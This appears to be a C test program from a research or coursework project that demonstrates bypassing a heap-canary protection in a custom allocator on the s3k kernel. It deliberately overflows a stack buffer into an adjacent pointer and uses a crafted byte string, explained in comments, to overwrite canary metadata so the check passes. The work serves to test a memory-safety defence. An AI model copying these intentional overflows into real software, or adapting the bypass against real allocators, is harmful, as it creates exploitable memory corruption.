#include "altc/altio.h"
#include "s3k/s3k.h"

#include "malloc.h"
#include "canary.h"
#include "canary_trap.h"

// strcpy can not be found even when importing string.h?
void alt_strcpy(char* dst, char* src){
	while(*src){
		*dst = *src;
		dst++;
		src++;
	}
}

// alt_gets does not work for me, but alt_getchar does work
// for some reasson the enter key gets carrage return, and not char newline (even though I am on linux)
// I assume that alt_gets expects newline
void alt2_gets(char* dst){
	char input;
	while(1){
		input = alt_getchar();
		if(input=='\r' || input=='\n' || !input) {
			*dst = 0; // add null at the end
			break;
		}
		*dst = input;
		dst++;
	}
}

int main(void)
{
	alt_puts("Testing malloc exploit");
	init_canary_table();
	s3k_init_malloc();
	
	
#if USE_TRAP
	init_canary_trap();
#endif
	// The only way I could find to force the compiler to place
	// user_string_copy at a higher address in the stack than user_input
	struct{
		char user_input[16];
		char *user_string_copy;
	} vulnerable_variables;
	
	vulnerable_variables.user_string_copy = s3k_simple_malloc(8);
	//Perform simple overflow on heap
	memset(vulnerable_variables.user_string_copy, 0, sizeof(char)*16); //Overwrites the canary

	print_malloc_debug_info("DEBUG AFTER FIRST!\n");
	alt_printf("a 0x%x, b 0x%x\n", &vulnerable_variables.user_input[0], &vulnerable_variables.user_string_copy);

	alt_printf("Enter text: \n");
	
	// Dangerous user input
	/*
	|	1. 16 padding character "a"
	|	2. hex value F81F0200, will overflow from user_input to user_string_copy
	|		will overwrite the 4 least significant bytes and make the pointer
	|		change value to 0x80021FF8, this is 8 bytes before the start of canary metadata
	|
	|	3. Canary metadata consists of an array of objects:
	|	-------------------------
	|	|	Canary Value 8B		|
	|	-------------------------
	|	|	Canary Pointer 8B	|
	|	-------------------------
	|
	|	The following string copy will overwrite the first canary value with all "a" characters
	|	and the 4 least significant bytes in canary pointer will be overwritten with F81F0200 turning
	|	it into 0x80021FF8 as well, since the value starting at this position is already 8 "a" characters
	|	the canary check will succed even though there was an overflow
	|
	|
	*/
	alt_strcpy(vulnerable_variables.user_input, "aaaaaaaaaaaaaaaa\xF8\x1F\x02");
	alt_printf("GOT USER STRING %s\n", vulnerable_variables.user_input);

	// Dangerous string copy function
	alt_strcpy(vulnerable_variables.user_string_copy, vulnerable_variables.user_input);
	check_canary();
	alt_printf("Ran canary check\n");
}
